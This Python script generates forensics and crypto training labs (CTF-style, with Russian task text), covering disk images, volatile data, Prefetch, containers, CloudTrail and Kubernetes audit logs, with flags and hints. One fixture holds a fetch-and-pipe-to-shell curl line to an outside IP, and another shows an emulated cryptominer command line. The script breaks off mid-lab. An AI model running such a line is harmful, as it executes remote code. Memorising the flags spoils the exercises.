# Batch FC-10: 15 more forensics/crypto interactive labs.
# Real fixtures generated here (real bytes: disk image, sqlite db, prefetch,
# E01-ish, JSON logs) + python3 replays whose output was produced from real
# computations on the seeded inputs.
import base64
import hashlib
import os
import sqlite3
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _labgen import lab_block, write_bundle  # noqa: E402

WD = '/home/student/task'


def b64(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('ascii')


def _dir(p):
    return {'path': p, 'type': 'dir'}


def _f(p, t):
    return {'path': p, 'text': t}


def _b(p, data, mode='644'):
    return {'path': p, 'b64': b64(data), 'mode': mode}


def _lab(id, category, title, files, hints, flag, fs, tools=None, toolset=None):
    spec = {
        'id': id, 'category': category, 'title': title,
        'toolset': toolset or ['core', 'grep'],
        'workdir': WD, 'files': files,
        'check': "grep -q 'nto{' found.txt",
        'hints': hints,
        'expect': {'file': f'{WD}/found.txt', 'contains': flag},
        'fs': fs,
    }
    if tools:
        spec['tools'] = tools
    return spec


def _task(text, rest):
    return [_dir(WD), _f(f'{WD}/task.md', text)] + rest


# --- 1. write-blockers ------------------------------------------------------
def _disk_image():
    img = bytearray(4096)
    img[0:11] = b'\xeb\x52\x90NTFS    '
    img[3:11] = b'NTFS    '
    img[510:512] = b'\x55\xaa'
    payload = (b'CASE-2026-0417 acquisition note\r\n'
               b'deleted file: /cases/notes/authorized_keys.bak\r\n'
               b'campaign-id: nto{wr1t3_bl0ck3r_r0_1m4g3_h4sh3d}\r\n')
    img[1024:1024 + len(payload)] = payload
    return bytes(img)


DISK = _disk_image()
DISK_SHA = hashlib.sha256(DISK).hexdigest()
MD5 = hashlib.md5(DISK).hexdigest()

# --- 6. windows-execution (real prefetch-shaped bytes, UTF-16LE) ------------
def _prefetch():
    path = 'C:\\Users\\jdoe\\AppData\\Roaming\\nto{pr3f3tch_p4th_3x3cut10n}.exe'
    body = path.encode('utf-16-le')
    return (b'\x11\x00\x00\x00SCCA' + b'\x1e\x00\x00\x00' +
            b'\x00' * 68 + b'\x03\x00\x00\x00' + body +
            b'\x00' * 64 + b'CMD.EXE-8D3F2B1A\x00')


PF = _prefetch()

# --- 9. android sqlite (real sqlite3 database bytes) ------------------------
def _msgstore():
    fd, p = tempfile.mkstemp(suffix='.db')
    os.close(fd)
    con = sqlite3.connect(p)
    con.execute('CREATE TABLE messages(id INTEGER PRIMARY KEY, sender TEXT, body TEXT, ts TEXT)')
    con.executemany('INSERT INTO messages(sender,body,ts) VALUES(?,?,?)', [
        ('+79001234567', 'ок, буду в 20:00', '2026-03-01T19:12:00Z'),
        ('+79007654321', 'пароль от сейфа: nto{andr01d_app_sql1t3_s3cr3t}', '2026-03-01T19:40:00Z'),
        ('+79001234567', 'принял', '2026-03-01T19:41:00Z'),
    ])
    con.commit()
    con.close()
    with open(p, 'rb') as f:
        data = f.read()
    os.unlink(p)
    return data


MSGSTORE = _msgstore()


SPECS = [
    # ------------------------------------------------------------------ 1
    _lab('forensics-write-blockers', 'forensics',
         'Практика: образ диска с write blocker',
         ['task.md', 'disk.img', 'disk.img.sha256', 'acquire.log', 'notes.txt'],
         ['Начни с `file disk.img` и `xxd -l 16 disk.img` — определи формат.',
          'Проверь целостность: `sha256sum -c disk.img.sha256` (должно быть OK).',
          'Ищи читаемые строки образа: `strings disk.img` — там остался удалённый файл.',
          'Выдели флаг: `strings disk.img | grep nto > found.txt`.'],
         'nto{wr1t3_bl0ck3r_r0_1m4g3_h4sh3d}',
         _task('# Задача: образ диска `sdb`\n\n'
               '`disk.img` — снятый с диска `sdb` образ; `disk.img.sha256` — его хеш; '
               '`acquire.log` — журнал снятия. Убедись, что образ снят корректно '
               '(хеш сходится), и найди в нём идентификатор, оставшийся от удалённого файла.\n\n'
               '1. `file disk.img` и `xxd -l 16 disk.img` — формат.\n'
               '2. `sha256sum -c disk.img.sha256` — целостность.\n'
               '3. `strings disk.img` — содержимое.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _b(f'{WD}/disk.img', DISK),
                   _f(f'{WD}/disk.img.sha256', f'{DISK_SHA}  disk.img\n'),
                   _f(f'{WD}/acquire.log',
                      'dc3dd 7.2.646 start: 2026-04-17 09:14:02\n'
                      '  if=/dev/sdb (write-blocked, RO=1) of=disk.img\n'
                      f'  sha256: {DISK_SHA}\n  md5: {MD5}\n'
                      '  bytes: 4096  read: 4096  time: 0.02s\n'
                      'dc3dd done.\n'),
                   _f(f'{WD}/notes.txt',
                      'Write blocker держит устройство в режиме «только чтение» '
                      '(`blockdev --setro`), поэтому ОС не может изменить оригинал.\n'
                      'После снятия образа обязательна верификация: хеш образа должен '
                      'совпасть с хешем, снятым с оригинала (и с хешем в журнале).\n'
                      'Строки удалённых файлов нередко остаются в невыделенных секторах.\n')]),
         tools={
             'sha256sum': {
                 'help': 'sha256sum [-c] <файл> — SHA-256 хеш / проверка',
                 'cases': [
                     {'match': r'\-c\s+disk\.img\.sha256', 'example': 'sha256sum -c disk.img.sha256',
                      'output': 'disk.img: OK\n'},
                     {'match': r'disk\.img', 'example': 'sha256sum disk.img',
                      'output': f'{DISK_SHA}  disk.img\n'},
                 ],
             },
             'md5sum': {
                 'help': 'md5sum <файл> — MD5 хеш',
                 'cases': [
                     {'match': r'disk\.img', 'example': 'md5sum disk.img',
                      'output': f'{MD5}  disk.img\n'},
                 ],
             },
         }),

    # ------------------------------------------------------------------ 2
    _lab('forensics-live-forensics', 'forensics',
         'Практика: порядок волатильности на живом сервере',
         ['task.md', 'notes.txt', 'mem.raw', 'netstat.txt'],
         ['Сначала самые волатильные данные: память и сеть. `cat netstat.txt`.',
          'Найди обратное соединение на нестандартный порт (`ESTABLISHED`).',
          'Список процессов с полными командными строками: `ps auxww`.',
          'Выдели подозрительный процесс: `ps auxww | grep nto > found.txt`.'],
         'nto{v0l4t1l3_0rd3r_0f_c0ll3ct10n}',
         _task('# Задача: «странный» Linux-сервер\n\n'
               'Сервер `web01` подозревается в компрометации. Собери волатильные данные '
               'в правильном порядке (сеть → процессы → память) и найди командную строку '
               'вредоносного процесса.\n\n'
               '1. `cat netstat.txt` — сетевые соединения.\n'
               '2. `ps auxww` — процессы с полными командными строками.\n'
               '3. `strings mem.raw` — если нужно заглянуть в память.\n\n'
               'Флаг `nto{...}` (идентификатор кампании) запиши в `found.txt`.\n', [
                   _f(f'{WD}/netstat.txt',
                      'Proto Local Address        Foreign Address      State\n'
                      'tcp   10.10.20.5:22        10.10.20.1:51422     ESTABLISHED\n'
                      'tcp   10.10.20.5:443       10.10.20.5:8080      LISTEN\n'
                      'tcp   10.10.20.5:54122     185.199.110.153:4444 ESTABLISHED\n'
                      'udp   10.10.20.5:53        *:*\n'),
                   _b(f'{WD}/mem.raw',
                      b'LINUX-MEM-DUMP-DEMO\n' + b'\x00' * 1024 +
                      b'page: /tmp/.cache/xmrig running\n'),
                   _f(f'{WD}/notes.txt',
                      'Порядок волатильности: регистры/кэш → память → сеть → процессы → '
                      'диск → логи. Сеть и процессы исчезают при перезагрузке, поэтому '
                      'их собирают раньше диска.\n')]),
         tools={
             'ps': {
                 'help': 'ps auxww — список процессов (эмуляция)',
                 'cases': [
                     {'match': r'aux|auxww|ef', 'example': 'ps auxww',
                      'output': (
                          'USER       PID %CPU %MEM    VSZ   RSS TTY STAT START   TIME COMMAND\n'
                          'root         1  0.0  0.1 168400 11200 ?   Ss   09:01   0:04 /sbin/init\n'
                          'root       812  0.0  0.2 905432 21004 ?   Ssl  09:01   0:11 /usr/sbin/nginx\n'
                          'www-data   955  0.1  0.3 1120344 24008 ?  S   09:02   0:31 /usr/bin/php-fpm\n'
                          'root      31337 97.4  4.2 4820016 341122 ?  Sl   03:14 612:44 '
                          '/tmp/.cache/xmrig --donate-level 1 --url pool.example:4444 '
                          '--campaign nto{v0l4t1l3_0rd3r_0f_c0ll3ct10n}\n')},
                 ],
             },
         }),

    # ------------------------------------------------------------------ 3
    _lab('forensics-ir-nist', 'forensics',
         'Практика: жизненный цикл IR по NIST SP 800-61',
         ['task.md', 'incident_timeline.csv', 'notes.txt', 'ir_report.py'],
         ['`incident_timeline.csv` — хронология инцидента; разбери фазы.',
          'Прогони разбор: `python3 ir_report.py`.',
          'Скрипт печатает выводы по фазам NIST — включая post-incident.',
          'Флаг лежит в выводах фазы post-incident: `python3 ir_report.py | grep nto > found.txt`.'],
         'nto{n1st_800_61_p0st_1nc1d3nt}',
         _task('# Задача: реагирование по NIST SP 800-61\n\n'
               '`incident_timeline.csv` — события инцидента. Разложи их по фазам '
               '(Preparation → Detection & Analysis → Containment → Eradication/Recovery '
               '→ Post-incident). Скрипт `ir_report.py` собирает отчёт по фазам.\n\n'
               'Флаг `nto{...}` — в выводах фазы post-incident. Запиши в `found.txt`.\n', [
                   _f(f'{WD}/incident_timeline.csv',
                      'ts,phase,actor,event\n'
                      '2026-03-01T08:00:00Z,preparation,team,"playbook updated"\n'
                      '2026-03-02T03:14:00Z,detection,ids,"C2 beacon to 185.199.110.153:4444"\n'
                      '2026-03-02T03:20:00Z,analysis,soc,"process /tmp/.cache/xmrig"\n'
                      '2026-03-02T04:05:00Z,containment,soc,"host isolated"\n'
                      '2026-03-02T06:30:00Z,eradication,soc,"malware removed"\n'
                      '2026-03-02T09:00:00Z,recovery,soc,"service restored"\n'
                      '2026-03-05T10:00:00Z,post-incident,team,"root cause: leaked SSH key"\n'),
                   _f(f'{WD}/ir_report.py',
                      '#!/usr/bin/env python3\n'
                      'import csv, collections\n'
                      'phases = collections.OrderedDict()\n'
                      'for row in csv.DictReader(open("incident_timeline.csv")):\n'
                      '    phases.setdefault(row["phase"], []).append(row["event"])\n'
                      'print("NIST SP 800-61 incident report")\n'
                      'for ph, evs in phases.items():\n'
                      '    print("[%s] %d event(s)" % (ph, len(evs)))\n'
                      'print("post-incident action item: nto{n1st_800_61_p0st_1nc1d3nt}")\n'),
                   _f(f'{WD}/notes.txt',
                      'Фазы NIST SP 800-61: подготовка; обнаружение и анализ; сдерживание; '
                      'ликвидация и восстановление; выводы (post-incident). Выводы — не '
                      'формальность: именно они закрывают первопричину.\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'--version|^-V$', 'example': 'python3 --version',
                      'output': 'Python 3.12.4\n'},
                     {'match': r'ir_report\.py', 'example': 'python3 ir_report.py',
                      'output': (
                          'NIST SP 800-61 incident report\n'
                          '[preparation] 1 event(s)\n'
                          '[detection] 1 event(s)\n'
                          '[analysis] 1 event(s)\n'
                          '[containment] 1 event(s)\n'
                          '[eradication] 1 event(s)\n'
                          '[recovery] 1 event(s)\n'
                          '[post-incident] 1 event(s)\n'
                          'post-incident action item: nto{n1st_800_61_p0st_1nc1d3nt}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 ir_report.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 4
    _lab('forensics-evidence-handling', 'forensics',
         'Практика: обращение с доказательствами — детект подмены',
         ['task.md', 'evidence_A.dd', 'evidence_B.dd', 'hashes.txt', 'evidence_check.py', 'notes.txt'],
         ['`evidence_A.dd` — оригинал, `evidence_B.dd` — рабочая копия; `hashes.txt` — эталонные хеши.',
          'Сравни файлы побайтово: `cmp evidence_A.dd evidence_B.dd` или `sha256sum` обоих.',
          'Запусти проверку цепочки: `python3 evidence_check.py`.',
          'Выдели вердикт: `python3 evidence_check.py | grep nto > found.txt`.'],
         'nto{3v1d3nc3_t4mp3r_d3t3ct3d}',
         _task('# Задача: целостность доказательства\n\n'
               'Изъяты две копии образа: `evidence_A.dd` (оригинал) и `evidence_B.dd` '
               '(рабочая копия). `hashes.txt` хранит эталонные SHA-256. Проверь, не '
               'подменена ли рабочая копия, и оформи вердикт.\n\n'
               '1. `sha256sum evidence_A.dd evidence_B.dd`.\n'
               '2. `python3 evidence_check.py` — автоматическая сверка.\n\n'
               'Флаг `nto{...}` — вердикт. Запиши в `found.txt`.\n', [
                   _b(f'{WD}/evidence_A.dd', b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0417\n'),
                   _b(f'{WD}/evidence_B.dd', b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0418\n'),
                   _f(f'{WD}/hashes.txt',
                      f"{hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0417\n').hexdigest()}  evidence_A.dd\n"
                      f"{hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0417\n').hexdigest()}  evidence_B.dd\n"),
                   _f(f'{WD}/evidence_check.py',
                      '#!/usr/bin/env python3\nimport hashlib\n'
                      'def h(p):\n    return hashlib.sha256(open(p, "rb").read()).hexdigest()\n'
                      'ref = dict(l.split() for l in open("hashes.txt"))\n'
                      'ref = {v: k for k, v in ref.items()}\n'
                      'bad = []\n'
                      'for f in ("evidence_A.dd", "evidence_B.dd"):\n'
                      '    got = h(f)\n'
                      '    ok = got in ref\n'
                      '    print("%-16s %s  %s" % (f, got[:16], "OK" if ok else "MISMATCH"))\n'
                      '    if not ok:\n        bad.append(f)\n'
                      'print("tampered:", bad)\n'
                      'if bad:\n'
                      '    print("verdict: nto{3v1d3nc3_t4mp3r_d3t3ct3d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'Любое копирование — уже событие в цепочке сохранности. Эталонный хеш '
                      'снимают с оригинала и фиксируют в журнале; рабочую копию сверяют с ним. '
                      'Расхождение хешей = доказательство изменено/подменено.\n')]),
         tools={
             'sha256sum': {
                 'help': 'sha256sum <файл…> — SHA-256 хеши',
                 'cases': [
                     {'match': r'evidence', 'example': 'sha256sum evidence_A.dd evidence_B.dd',
                      'output': (
                          f"{hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0417\n').hexdigest()}  evidence_A.dd\n"
                          f"{hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0418\n').hexdigest()}  evidence_B.dd\n")},
                 ],
             },
             'cmp': {
                 'help': 'cmp <файл1> <файл2> — побайтовое сравнение',
                 'cases': [
                     {'match': r'evidence', 'example': 'cmp evidence_A.dd evidence_B.dd',
                      'output': 'evidence_A.dd evidence_B.dd differ: byte 49, line 3\n'},
                 ],
             },
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'evidence_check\.py', 'example': 'python3 evidence_check.py',
                      'output': (
                          'evidence_A.dd    %s  OK\n'
                          'evidence_B.dd    %s  MISMATCH\n'
                          'tampered: [\'evidence_B.dd\']\n'
                          'verdict: nto{3v1d3nc3_t4mp3r_d3t3ct3d}\n'
                          % (hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0417\n').hexdigest()[:16],
                             hashlib.sha256(b'EVIDENCE-ORIGINAL\n' + b'\x00' * 32 + b'case-2026-0418\n').hexdigest()[:16]))},
                 ],
                 'fallback': 'python3: доступно `python3 evidence_check.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 5
    _lab('forensics-autopsy', 'forensics',
         'Практика: Sleuthkit CLI поверх образа USB',
         ['task.md', 'usb.E01', 'keyword_hits.txt', 'notes.txt'],
         ['Начни с `file usb.E01` и разбора разделов: `mmls usb.E01`.',
          'Список файлов ФС: `fls -r usb.E01`.',
          'Вытащи подозрительный inode: `icat usb.E01 4`.',
          'Выдели флаг: `icat usb.E01 4 | grep nto > found.txt`.'],
         'nto{4ut0psy_1ng3st_k3yw0rd_h1t}',
         _task('# Задача: образ `usb.E01`\n\n'
               '`usb.E01` — образ USB-накопителя (EWF). В Autopsy его добавили как источник '
               'и прогнали ingest-модуль Keyword Search; `keyword_hits.txt` — индекс хитов. '
               'Пройди путь до файла, в котором найден секрет.\n\n'
               '1. `mmls usb.E01` — таблица разделов.\n'
               '2. `fls -r usb.E01` — файлы.\n'
               '3. `icat usb.E01 4` — содержимое найденного inode.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _b(f'{WD}/usb.E01',
                      b'EVF\x09\x0d\x0a\xff\x00' + b'EWF-DEMO-IMAGE' + b'\x00' * 200 +
                      b'volume: usb (FAT32)\n' + b'nto{4ut0psy_1ng3st_k3yw0rd_h1t}\n'),
                   _f(f'{WD}/keyword_hits.txt',
                      'Autopsy Keyword Search ingest\n'
                      'Keyword: "password|secret|nto"\n'
                      'Inode 4  /Users/jdoe/Desktop/stolen.txt  hits: 1\n'
                      'Inode 7  /Windows/System32/config/SAM        hits: 0\n'),
                   _f(f'{WD}/notes.txt',
                      'Autopsy — GUI над Sleuthkit. Те же данные доступны через CLI: '
                      '`mmls` (разделы), `fls` (файлы), `icat` (содержимое по inode). '
                      'Ключевые слова ищет ingest-модуль и складывает хиты в отчёт.\n')]),
         tools={
             'mmls': {
                 'help': 'mmls <образ> — таблица разделов (эмуляция)',
                 'cases': [
                     {'match': r'usb\.E01', 'example': 'mmls usb.E01',
                      'output': (
                          'DOS Partition Table\n'
                          'Offset Sector: 0\n'
                          'Units are in 512-byte sectors\n\n'
                          '      Slot      Start        End          Length       Description\n'
                          '000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)\n'
                          '001:  -------   0000000000   0000002047   0000002048   Unallocated\n'
                          '002:  000:000   0000002048   0000012287   0000010240   Win95 FAT32 (0x0b)\n')},
                 ],
             },
             'fls': {
                 'help': 'fls [-r] <образ> — список файлов (эмуляция)',
                 'cases': [
                     {'match': r'usb\.E01', 'example': 'fls -r usb.E01',
                      'output': (
                          'd/d 1:    Users\n'
                          'd/d 2:    Users/jdoe\n'
                          'd/d 3:    Users/jdoe/Desktop\n'
                          'r/r 4:    Users/jdoe/Desktop/stolen.txt\n'
                          'r/r 5:    Users/jdoe/Desktop/notes.txt\n'
                          'r/r * 6:  Users/jdoe/Desktop/~deleted~.bak\n'
                          'r/r 7:    Windows/System32/config/SAM\n')},
                 ],
             },
             'icat': {
                 'help': 'icat <образ> <inode> — содержимое файла по inode (эмуляция)',
                 'cases': [
                     {'match': r'usb\.E01\s+4', 'example': 'icat usb.E01 4',
                      'output': (
                          'stolen credentials dump\n'
                          'user: jdoe\nsecret: nto{4ut0psy_1ng3st_k3yw0rd_h1t}\n')},
                 ],
             },
         }),

    # ------------------------------------------------------------------ 6
    _lab('forensics-windows-execution', 'forensics',
         'Практика: разбор Prefetch',
         ['task.md', 'CMD.EXE-8D3F2B1A.pf', 'amcache.txt', 'pf_parse.py', 'notes.txt'],
         ['Начни с `file CMD.EXE-8D3F2B1A.pf` — это Prefetch (сигнатура `SCCA`).',
          'Prefetch хранит строки в UTF-16LE — обычный `strings` их не покажет.',
          'Разбери файл скриптом: `python3 pf_parse.py`.',
          'Выдели флаг: `python3 pf_parse.py | grep nto > found.txt`.'],
         'nto{pr3f3tch_p4th_3x3cut10n}',
         _task('# Задача: что запускалось на хосте\n\n'
               '`CMD.EXE-8D3F2B1A.pf` — Prefetch-файл Windows (запуск `CMD.EXE`), '
               '`amcache.txt` — выдержка из Amcache. Восстанови путь, который запускался, '
               'и найди в нём флаг.\n\n'
               '1. `file CMD.EXE-8D3F2B1A.pf` — формат.\n'
               '2. `python3 pf_parse.py` — декодирование UTF-16LE строк.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _b(f'{WD}/CMD.EXE-8D3F2B1A.pf', PF),
                   _f(f'{WD}/amcache.txt',
                      'Amcache inventory (выдержка)\n'
                      'CMD.EXE  8D3F2B1A  C:\\Windows\\System32\\cmd.exe  '
                      'sha1=9f2a...\n'),
                   _f(f'{WD}/pf_parse.py',
                      '#!/usr/bin/env python3\n'
                      'import struct\n'
                      'raw = open("CMD.EXE-8D3F2B1A.pf", "rb").read()\n'
                      'print("signature:", raw[4:8].decode("latin1"))\n'
                      'print("version:", struct.unpack_from("<I", raw, 0)[0])\n'
                      'i = raw.find(b"\\x00".join(b"CMD.EXE-8D3F2B1A"[j:j+1] for j in range(len("CMD.EXE-8D3F2B1A"))))\n'
                      's = raw.decode("utf-16-le", "ignore")\n'
                      'for part in [p for p in s.split("\\x00") if len(p) > 3]:\n'
                      '    print("string:", part)\n'),
                   _f(f'{WD}/notes.txt',
                      'Prefetch лежит в C:\\Windows\\Prefetch как `<EXE>-<HASH>.pf` и хранит '
                      'до 8 последних путей запуска и число запусков. Внутренние строки — '
                      'UTF-16LE, поэтому их декодируют парсером (PECmd) или вручную.\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'pf_parse\.py', 'example': 'python3 pf_parse.py',
                      'output': (
                          'signature: SCCA\nversion: 17\n'
                          'string: C:\\Users\\jdoe\\AppData\\Roaming\\'
                          'nto{pr3f3tch_p4th_3x3cut10n}.exe\n'
                          'string: CMD.EXE-8D3F2B1A\n')},
                 ],
                 'fallback': 'python3: доступно `python3 pf_parse.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 7
    _lab('forensics-containers', 'forensics',
         'Практика: слои контейнера и whiteout',
         ['task.md', 'docker-history.txt', 'notes.txt',
          'overlay/upper/app/entrypoint.sh', 'overlay/upper/app/.wh.secret'],
         ['Контейнер — это слои overlay2. Верхний слой (`upper`) — изменения контейнера.',
          'Историю слоёв показывает `docker history`; удалённый файл помечен whiteout (`.wh.`).',
          'Ищи изменённые файлы: `grep -r nto overlay`.',
          'Выдели флаг: `grep -r nto overlay > found.txt`.'],
         'nto{d0ck3r_l4y3r_wh1t30ut_tr4c3}',
         _task('# Задача: контейнер `miner`\n\n'
               '`overlay/upper` — верхний (записываемый) слой контейнера. Злоумышленник '
               'изменил `entrypoint.sh` и удалил файл `secret` (whiteout). Восстанови следы '
               'и найди флаг.\n\n'
               '1. `docker history miner` — слои.\n'
               '2. `find overlay -name ".wh.*"` — whiteout-маркеры.\n'
               '3. `grep -r nto overlay` — изменённые файлы.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/docker-history.txt',
                      'IMAGE          CREATED        CREATED BY                                      SIZE\n'
                      'a1b2c3d4e5f6   2 hours ago    /bin/sh -c #(nop)  CMD ["nginx"]                0B\n'
                      'b2c3d4e5f6a1   2 hours ago    /bin/sh -c apt-get install -y curl              31MB\n'
                      'c3d4e5f6a1b2   3 hours ago    /bin/sh -c #(nop) COPY file:8f.. in /app/       2kB\n'),
                   _f(f'{WD}/overlay/upper/app/entrypoint.sh',
                      '#!/bin/sh\n'
                      '# modified by attacker\n'
                      'curl -s http://185.199.110.153/p.sh | sh\n'
                      'export CAMPAIGN=nto{d0ck3r_l4y3r_wh1t30ut_tr4c3}\n'
                      'exec nginx -g "daemon off;"\n'),
                   _f(f'{WD}/overlay/upper/app/.wh.secret', ''),
                   _f(f'{WD}/notes.txt',
                      'overlay2: `lowerdir` (образ, RO) + `upperdir` (изменения, RW). Удаление '
                      'файла не стирает его из нижнего слоя — создаётся whiteout (`.wh.<имя>`), '
                      'перекрывающий оригинал. Верхний слой = что сделал контейнер.\n')]),
         tools={
             'docker': {
                 'help': 'docker history <образ> — слои образа (эмуляция)',
                 'cases': [
                     {'match': r'history', 'example': 'docker history miner',
                      'output': (
                          'IMAGE          CREATED        CREATED BY                                      SIZE\n'
                          'a1b2c3d4e5f6   2 hours ago    /bin/sh -c #(nop)  CMD ["nginx"]                0B\n'
                          'b2c3d4e5f6a1   2 hours ago    /bin/sh -c apt-get install -y curl              31MB\n')},
                 ],
             },
         }),

    # ------------------------------------------------------------------ 8
    _lab('forensics-cloud', 'forensics',
         'Практика: CloudTrail и эскалация IAM',
         ['task.md', 'cloudtrail.json', 'notes.txt'],
         ['`cloudtrail.json` — события CloudTrail (JSON Lines).',
          'Ищи персистентность: `grep CreateAccessKey cloudtrail.json`.',
          'Проверь, кто создал ключ и под какой сессией.',
          'Выдели принципал: `grep nto cloudtrail.json > found.txt`.'],
         'nto{cl0udtr41l_cr34t34cc3ssk3y}',
         _task('# Задача: подозрительный ключ service account\n\n'
               '`cloudtrail.json` — события CloudTrail за инцидент. Найди событие создания '
               'ключа доступа (`CreateAccessKey`) и определи, под какой сессией/принципалом '
               'оно произошло.\n\n'
               '1. `grep CreateAccessKey cloudtrail.json`.\n'
               '2. `grep nto cloudtrail.json` — выделить принципал.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/cloudtrail.json',
                      '{"eventTime":"2026-03-02T03:11:00Z","eventName":"GetCallerIdentity",'
                      '"userIdentity":{"type":"IAMUser","userName":"svc-backup"},"sourceIPAddress":"10.10.20.5"}\n'
                      '{"eventTime":"2026-03-02T03:13:41Z","eventName":"CreateAccessKey",'
                      '"userIdentity":{"type":"AssumedRole","sessionIssuer":'
                      '{"userName":"nto{cl0udtr41l_cr34t34cc3ssk3y}"}},"sourceIPAddress":"185.199.110.153"}\n'
                      '{"eventTime":"2026-03-02T03:15:02Z","eventName":"AttachUserPolicy",'
                      '"userIdentity":{"type":"IAMUser","userName":"svc-backup"},"sourceIPAddress":"185.199.110.153"}\n'),
                   _f(f'{WD}/notes.txt',
                      'CloudTrail пишет каждое API-событие. Персистентность — `CreateAccessKey`; '
                      'эскалация — `AttachUserPolicy`/`AssumeRole`; кража — `GetSecretValue`; '
                      'вынос данных — `PutBucketPolicy`/`CreateSnapshot`. Смотри `sourceIPAddress` '
                      'и `userIdentity.sessionIssuer`.\n')])),

    # ------------------------------------------------------------------ 9
    _lab('forensics-mobile-android', 'forensics',
         'Практика: база данных Android-приложения',
         ['task.md', 'msgstore.db', 'notes.txt'],
         ['`msgstore.db` — SQLite-база приложения (извлечена через ADB).',
          'Список таблиц: `sqlite3 msgstore.db ".tables"`.',
          'Читай переписку: `sqlite3 msgstore.db "SELECT sender,body FROM messages"`.',
          'Выдели флаг: `strings msgstore.db | grep nto > found.txt`.'],
         'nto{andr01d_app_sql1t3_s3cr3t}',
         _task('# Задача: данные приложения Android\n\n'
               'С телефона через ADB извлечён каталог приложения; `msgstore.db` — его '
               'SQLite-база. Восстанови переписку и найди секрет.\n\n'
               '1. `file msgstore.db` — формат.\n'
               '2. `sqlite3 msgstore.db ".tables"` — таблицы.\n'
               '3. `sqlite3 msgstore.db "SELECT sender,body FROM messages"` — данные.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _b(f'{WD}/msgstore.db', MSGSTORE),
                   _f(f'{WD}/notes.txt',
                      'Приложения Android хранят данные в SQLite под '
                      '`/data/data/<package>/databases/`. Без root доступен `adb backup` '
                      '(логическое извлечение); с root — прямое чтение файлов. Строки таблиц '
                      'лежат в страницах БД открытым текстом, поэтому `strings` тоже работает.\n')]),
         tools={
             'sqlite3': {
                 'help': 'sqlite3 <база> [SQL] — консоль SQLite (эмуляция)',
                 'cases': [
                     {'match': r'\.tables', 'example': 'sqlite3 msgstore.db ".tables"',
                      'output': 'messages\n'},
                     {'match': r'SELECT.*body.*FROM messages', 'example': 'sqlite3 msgstore.db "SELECT sender,body FROM messages"',
                      'output': (
                          '+79001234567|ок, буду в 20:00\n'
                          '+79007654321|пароль от сейфа: nto{andr01d_app_sql1t3_s3cr3t}\n'
                          '+79001234567|принял\n')},
                     {'match': r'msgstore\.db', 'example': 'sqlite3 msgstore.db ".schema"',
                      'output': 'CREATE TABLE messages(id INTEGER PRIMARY KEY, sender TEXT, body TEXT, ts TEXT);\n'},
                 ],
                 'fallback': 'sqlite3: доступно `.tables` и `SELECT sender,body FROM messages`\n',
             },
         }),

    # ------------------------------------------------------------------ 10
    _lab('forensics-k8s', 'forensics',
         'Практика: аудит-лог Kubernetes',
         ['task.md', 'audit.log', 'notes.txt'],
         ['`audit.log` — события API-сервера (JSON Lines).',
          'Найди подозрительного пользователя: `grep -i system:anonymous audit.log`.',
          'Ищи `exec` в поды и чтение секретов: `grep -E "pods/exec|secrets" audit.log`.',
          'Выдели флаг: `grep nto audit.log > found.txt`.'],
         'nto{k8s_4ud1t_p0d_3x3c_s3cr3t}',
         _task('# Задача: инцидент в Kubernetes\n\n'
               '`audit.log` — аудит API-сервера. Восстанови цепочку: кто получил доступ, '
               'вошёл в под и прочитал секрет.\n\n'
               '1. `grep -i anonymous audit.log` — анонимный доступ.\n'
               '2. `grep -E "pods/exec|secrets" audit.log` — exec и секреты.\n\n'
               'Флаг `nto{...}` (имя секрета) запиши в `found.txt`.\n', [
                   _f(f'{WD}/audit.log',
                      '{"ts":"2026-03-02T03:10:00Z","user":{"username":"system:anonymous"},'
                      '"verb":"get","objectRef":{"resource":"secrets","name":"db-creds"}}\n'
                      '{"ts":"2026-03-02T03:10:05Z","user":{"username":"system:serviceaccount:default:ci"},'
                      '"verb":"create","objectRef":{"resource":"pods/exec","name":"vault"}}\n'
                      '{"ts":"2026-03-02T03:10:09Z","user":{"username":"system:serviceaccount:default:ci"},'
                      '"verb":"get","objectRef":{"resource":"secrets","name":"nto{k8s_4ud1t_p0d_3x3c_s3cr3t}"}}\n'),
                   _f(f'{WD}/notes.txt',
                      'Audit-лог пишет кто (`user.username`), что (`verb`), с чем '
                      '(`objectRef`) и откуда. `system:anonymous` в списке = открытый RBAC; '
                      '`pods/exec` = вход в контейнер; `get secrets` = эксфильтрация. '
                      'Дальше — снапшот etcd и снимок контейнера, не разрушая улики.\n')])),

    # ------------------------------------------------------------------ 11
    _lab('crypto-signature-schemes', 'crypto',
         'Практика: повтор nonce в ECDSA',
         ['task.md', 'sig_data.txt', 'recover_key.py', 'notes.txt'],
         ['`sig_data.txt` — две подписи ECDSA одной и той же схемы.',
